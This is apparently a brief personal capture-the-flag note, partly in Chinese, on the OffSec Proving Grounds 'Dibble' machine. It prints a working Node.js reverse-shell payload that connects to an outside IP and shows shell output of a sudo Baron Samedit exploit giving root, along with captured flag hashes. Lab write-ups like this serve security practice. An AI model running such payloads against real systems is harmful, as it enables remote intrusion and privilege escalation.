参考资料https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Dibble.md
 
参考https://al1z4deh.medium.com/proving-grounds-dibble-e8b64c77a7fe  
[https://al1z4deh.medium.com/proving-grounds-dibble-e8b64c77a7fe](https://al1z4deh.medium.com/proving-grounds-dibble-e8b64c77a7fe)
 
[https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31](https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31)
 
参考  
[https://al1z4deh.medium.com/proving-grounds-dibble-e8b64c77a7fe](https://al1z4deh.medium.com/proving-grounds-dibble-e8b64c77a7fe)
    
(function(){  
var net = require("net"),  
cp = require("child_process"),  
sh = cp.spawn("/bin/sh", []);  
var client = new net.Socket();  
client.connect(3000, "192.168.45.219", function(){  
client.pipe(sh.stdin);  
sh.stdout.pipe(client);  
sh.stderr.pipe(client);  
});  
return /a/; // Prevents the Node.js application from crashing  
})();
 
修改的使用  
[https://ostermiller.org/calc/encode.html?source=post_page-----e8b64c77a7fe](https://ostermiller.org/calc/encode.html?source=post_page-----e8b64c77a7fe)---------------------------------------

![[Dibble image 4cb2107aba66293d.png|Exported image]]  
![[Dibble image 7dcb736a696f2011.png|Exported image]]   ![[Dibble image ecc2e8ad8616715f.png|Exported image]]  
![[Dibble image 3a913bd605955468.png|Exported image]]   
192.168.200.110  
[https://al1z4deh.medium.com/proving-grounds-dibble-e8b64c77a7fe](https://al1z4deh.medium.com/proving-grounds-dibble-e8b64c77a7fe)
      

diyige  
[benjamin@dibble ~]$ cat local.txt  
cat local.txt  
930a813559b776e065488936f482640a  
[benjamin@dibble ~]$
   

[benjamin@dibble tmp]$ python3 exploit_nss.py  
ls  
python3 exploit_nss.py
 
We trust you have received the usual lecture from the local System  
Administrator. It usually boils down to these three things:
 
#1) Respect the privacy of others.  
#2) Think before you type.  
#3) With great power comes great responsibility.
 
ls  
[root@dibble tmp]# ls  
exploit_nss.py  
libnss_X  
mongodb-27017.sock  
systemd-private-986595f6b64843f2af23c9705ebc84a4-chronyd.service-9zrsbf  
systemd-private-986595f6b64843f2af23c9705ebc84a4-dbus-broker.service-wMDV8h  
systemd-private-986595f6b64843f2af23c9705ebc84a4-httpd.service-TTDRPg  
systemd-private-986595f6b64843f2af23c9705ebc84a4-php-fpm.service-hcV49f  
systemd-private-986595f6b64843f2af23c9705ebc84a4-systemd-logind.service-qNyYWg  
[root@dibble tmp]# cd /root  
cd /root  
[root@dibble root]# ls  
ls  
proof.txt  
[root@dibble root]# cat proof.txt  
cat proof.txt  
f53ef5921e2ecf86626198f05376a2de  
[root@dibble root]#